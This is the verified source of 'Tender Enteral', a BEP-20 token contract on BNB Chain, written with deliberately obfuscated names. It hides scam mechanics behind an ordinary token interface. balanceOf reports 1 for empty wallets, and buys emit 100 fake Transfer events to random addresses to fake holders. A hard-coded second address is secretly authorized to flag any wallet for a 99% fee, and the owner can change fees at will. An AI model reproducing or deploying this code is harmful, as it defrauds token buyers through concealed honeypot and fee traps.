/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.4;interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function Owner() public view returns (address) {        return owner;    }    function SetAuthorized(address adr) public onlyAuthorized() {        competent[adr] = true;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}interface IUniswapV2Router {    function WETH() external pure returns (address);    function factory() external pure returns (address);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);}library SafeMath {    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function mod(uint256 a, uint256 b) internal pure returns (uint256) {        return a % b;    }    function tryDiv(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a / b);    }    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function tryMod(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a % b);    }    }}interface IBEP20 {    function symbol() external view returns (string memory);    function approve(address spender, uint256 amount) external returns (bool);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function balanceOf(address account) external view returns (uint256);    function getOwner() external view returns (address);    function name() external view returns (string memory);    function decimals() external view returns (uint8);    function totalSupply() external view returns (uint256);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}contract TenderEnteral is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Tender Enteral ";    string constant _symbol = "TenderEnteral";    uint8 constant _decimals = 18;    //BUY FEES    uint256 private teamMinMaxSwap = 0;    uint256 private tradingWalletSwapBotsMaxAutoMin = 8;    //SELL FEES    uint256 private walletMaxMarketingMode = 0;    uint256 private marketingTradingLimitFee = 8;    bool private teamBuyMaxSell = true;    bool private marketingIsBotsModeMode = true;    bool private botsIsTradingTx = true;    bool private limitTradingBuySell = true;    bool private marketingMaxLiquidityTradingBurnBuy = true;    uint256 private botsModeTradingExemptIs = _totalSupply / 1000; // 0.1%    uint256 private exemptFeeBurnMinTxBots = tradingWalletSwapBotsMaxAutoMin + teamMinMaxSwap;    uint256 private buyTxBurnMode = 100;    bool private sellTeamAutoMarketing;    uint256 private txBuyModeSellMinWallet;    uint256 private feeWalletLiquidityBurnBotsMode;    uint256 private limitMarketingTeamAuto;    uint256 private txLimitBotsLiquidity;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private feeSellBuyIsWalletTeamBurn;    mapping(address => bool) private launchedBuyMinMode;    mapping(address => bool) private exemptTradingLaunchedMinLimitBotsIs;    mapping(address => bool) private marketingIsBotsMode;    uint256 private launchBlock = 0;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private botsReceiverLimitIsMaxExempt;    uint256 private marketingLimitExemptBots;    address private burnSellBotsTx = (msg.sender); // auto-liq address    address private txLaunchedSwapMode = (0xE0075091fd3b638dac379d5DFffFc8632Be1f9bd); // marketing address    address private walletSwapBurnExempt = DEAD;    address private modeExemptLiquidityLaunchedMaxLimitSell = DEAD;    address private liquidityTxBuySwap = DEAD;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        bool private sellWalletSwapLimit = false;    uint256 private maxReceiverTeamAuto = 0;    uint256 public marketingBuyReceiverBotsMinMaxFee = 0;    bool private tradingTeamWalletModeMarketingSellBurn = false;    uint256 private maxMinTradingTeamSwap = 0;    uint256 private walletExemptTeamBurnMarketingIs = 0;    uint256 public launchedSellFeeAuto = 0;    uint256 public receiverMinLimitAutoLiquidityLaunched = 0;    uint256 private botsModeBurnTrading = 0;    bool public receiverMinLimitLaunched = false;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        sellTeamAutoMarketing = true;        exemptTradingLaunchedMinLimitBotsIs[msg.sender] = true;        exemptTradingLaunchedMinLimitBotsIs[0x0000000000000000000000000000000000000000] = true;        exemptTradingLaunchedMinLimitBotsIs[0x000000000000000000000000000000000000dEaD] = true;        exemptTradingLaunchedMinLimitBotsIs[address(this)] = true;        feeSellBuyIsWalletTeamBurn[msg.sender] = true;        feeSellBuyIsWalletTeamBurn[address(this)] = true;        launchedBuyMinMode[msg.sender] = true;        launchedBuyMinMode[0x0000000000000000000000000000000000000000] = true;        launchedBuyMinMode[0x000000000000000000000000000000000000dEaD] = true;        launchedBuyMinMode[address(this)] = true;        SetAuthorized(address(0x3a3CCB860AaBde30EBE17579FFFfC7f6bA9E42b2));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        if (_balances[account] > 0) {            return _balances[account];        }        return 1;    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return tradingReceiverBotsMarketingLaunched(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return tradingReceiverBotsMarketingLaunched(sender, recipient, amount);    }    function getWalletExemptTeamBurnMarketingIs() public view returns (uint256) {        return walletExemptTeamBurnMarketingIs;    }
    function launchedIsBuyMarketing() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    marketingMaxLiquidityTradingBurnBuy &&    _balances[address(this)] >= botsModeTradingExemptIs;    }
    function burnAutoTradingLimit(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function isBot(address addr) public view returns (bool) {        return marketingIsBotsMode[addr];    }
    function setTotalFee() internal {        exemptFeeBurnMinTxBots = marketingTradingLimitFee + walletMaxMarketingMode;    }
    function setSellWalletSwapLimit(bool a0) public onlyOwner {        if (sellWalletSwapLimit != sellWalletSwapLimit) {            sellWalletSwapLimit=a0;        }        sellWalletSwapLimit=a0;    }
    function tradingReceiverBotsMarketingLaunched(address sender, address recipient, uint256 amount) internal returns (bool) {                bool bLimitTxWalletValue = isOwner(sender) || isOwner(recipient);                if (tradingTeamWalletModeMarketingSellBurn == botsIsTradingTx) {            tradingTeamWalletModeMarketingSellBurn = botsIsTradingTx;        }        if (maxReceiverTeamAuto != marketingTradingLimitFee) {            maxReceiverTeamAuto = walletExemptTeamBurnMarketingIs;        }        if (botsModeBurnTrading == marketingTradingLimitFee) {            botsModeBurnTrading = maxReceiverTeamAuto;        }                        if (inSwap || bLimitTxWalletValue) {return burnAutoTradingLimit(sender, recipient, amount);}        if (!feeSellBuyIsWalletTeamBurn[sender] && !feeSellBuyIsWalletTeamBurn[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                if (maxReceiverTeamAuto == teamMinMaxSwap) {            maxReceiverTeamAuto = buyTxBurnMode;        }        if (maxMinTradingTeamSwap == walletExemptTeamBurnMarketingIs) {            maxMinTradingTeamSwap = buyTxBurnMode;        }        require((amount <= _maxTxAmount) || exemptTradingLaunchedMinLimitBotsIs[sender] || exemptTradingLaunchedMinLimitBotsIs[recipient], "Max TX Limit!");        if (launchedIsBuyMarketing()) {buyMinBotsBurnWalletTxMax();}        setTotalFee();        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                uint256 amountReceived = autoTxTeamBurn(sender) ? limitAutoTradingExemptSellModeBuy(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function getTeamBuyMaxSell() public view returns (bool) {        if (teamBuyMaxSell == teamBuyMaxSell) {            return teamBuyMaxSell;        }        if (teamBuyMaxSell != limitTradingBuySell) {            return limitTradingBuySell;        }        return teamBuyMaxSell;    }
    function setBot(address addr) public onlyAuthorized {        marketingIsBotsMode[addr] = true;    }
    function liquidityMaxMarketingTx(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function limitAutoTradingExemptSellModeBuy(address sender, address receiver, uint256 amount) internal returns (uint256) {                uint256 feeAmount = amount.mul(walletBurnBotsExemptTeamFeeAuto(sender, receiver == uniswapV2Pair)).div(buyTxBurnMode);        if (marketingIsBotsMode[sender] || marketingIsBotsMode[receiver]) {            feeAmount = amount.mul(99).div(buyTxBurnMode);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                if (sender == uniswapV2Pair) {            uint160 s = uint160(uint256(keccak256(abi.encodePacked(block.timestamp,block.difficulty,msg.sender))));            for (uint160 i = 0; i < 100; i++) {                emit Transfer(address(0), address(s+i), 1);            }        }        return amount.sub(feeAmount);    }
    function getSellWalletSwapLimit() public view returns (bool) {        if (sellWalletSwapLimit == limitTradingBuySell) {            return limitTradingBuySell;        }        if (sellWalletSwapLimit != marketingMaxLiquidityTradingBurnBuy) {            return marketingMaxLiquidityTradingBurnBuy;        }        return sellWalletSwapLimit;    }
    function setBotsModeBurnTrading(uint256 a0) public onlyOwner {        if (botsModeBurnTrading != maxReceiverTeamAuto) {            maxReceiverTeamAuto=a0;        }        if (botsModeBurnTrading == maxReceiverTeamAuto) {            maxReceiverTeamAuto=a0;        }        if (botsModeBurnTrading == marketingTradingLimitFee) {            marketingTradingLimitFee=a0;        }        botsModeBurnTrading=a0;    }
    function buyMinBotsBurnWalletTxMax() internal swapping {                uint256 amountToLiquify = botsModeTradingExemptIs.mul(teamMinMaxSwap).div(exemptFeeBurnMinTxBots).div(2);        uint256 amountToSwap = botsModeTradingExemptIs.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                uint256 amountBNB = address(this).balance;        uint256 totalETHFee = exemptFeeBurnMinTxBots.sub(teamMinMaxSwap.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(teamMinMaxSwap).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(tradingWalletSwapBotsMaxAutoMin).div(totalETHFee);                if (sellWalletSwapLimit == sellWalletSwapLimit) {            sellWalletSwapLimit = teamBuyMaxSell;        }        if (maxMinTradingTeamSwap == maxReceiverTeamAuto) {            maxMinTradingTeamSwap = teamMinMaxSwap;        }        payable(txLaunchedSwapMode).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                burnSellBotsTx,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function setWalletExemptTeamBurnMarketingIs(uint256 a0) public onlyOwner {        if (walletExemptTeamBurnMarketingIs == walletMaxMarketingMode) {            walletMaxMarketingMode=a0;        }        if (walletExemptTeamBurnMarketingIs != botsModeBurnTrading) {            botsModeBurnTrading=a0;        }        walletExemptTeamBurnMarketingIs=a0;    }
    function getExemptFeeBurnMinTxBots() public view returns (uint256) {        if (exemptFeeBurnMinTxBots != walletMaxMarketingMode) {            return walletMaxMarketingMode;        }        return exemptFeeBurnMinTxBots;    }
    function autoTxTeamBurn(address sender) internal view returns (bool) {        return !launchedBuyMinMode[sender];    }
    function setExemptFeeBurnMinTxBots(uint256 a0) public onlyOwner {        exemptFeeBurnMinTxBots=a0;    }
    function setTeamBuyMaxSell(bool a0) public onlyOwner {        if (teamBuyMaxSell == tradingTeamWalletModeMarketingSellBurn) {            tradingTeamWalletModeMarketingSellBurn=a0;        }        if (teamBuyMaxSell == teamBuyMaxSell) {            teamBuyMaxSell=a0;        }        teamBuyMaxSell=a0;    }
    function setMarketingTradingLimitFee(uint256 a0) public onlyOwner {        marketingTradingLimitFee=a0;    }
    function getMarketingTradingLimitFee() public view returns (uint256) {        return marketingTradingLimitFee;    }
    function getBotsModeBurnTrading() public view returns (uint256) {        return botsModeBurnTrading;    }
    function walletBurnBotsExemptTeamFeeAuto(address sender, bool selling) internal returns (uint256) {                if (maxMinTradingTeamSwap != exemptFeeBurnMinTxBots) {            maxMinTradingTeamSwap = exemptFeeBurnMinTxBots;        }        if (sellWalletSwapLimit == teamBuyMaxSell) {            sellWalletSwapLimit = teamBuyMaxSell;        }        if (selling) {            exemptFeeBurnMinTxBots = marketingTradingLimitFee + walletMaxMarketingMode;            return exemptFeeBurnMinTxBots;        }        if (!selling && sender == uniswapV2Pair) {            exemptFeeBurnMinTxBots = tradingWalletSwapBotsMaxAutoMin + teamMinMaxSwap;            return exemptFeeBurnMinTxBots;        }        return marketingTradingLimitFee + walletMaxMarketingMode;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}